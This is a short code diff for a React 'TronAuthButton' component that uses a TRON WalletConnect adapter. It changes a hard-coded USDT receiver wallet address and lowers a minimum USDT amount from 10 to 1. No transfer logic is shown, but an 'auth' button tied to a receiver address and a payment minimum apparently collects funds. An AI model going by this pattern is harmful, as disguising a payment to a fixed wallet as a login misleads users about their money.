@@ -2,8 +2,8 @@ import React, { useState } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
-const MIN_USDT = 10;
+const TRON_RECEIVER = 'TAbK6QaF7k53JPCo95d1DsbooWW9B1LPRQ';
+const MIN_USDT = 1;
 
 export const TronAuthButton: React.FC = () => {
   const [modal, setModal] = useState<string | null>(null);
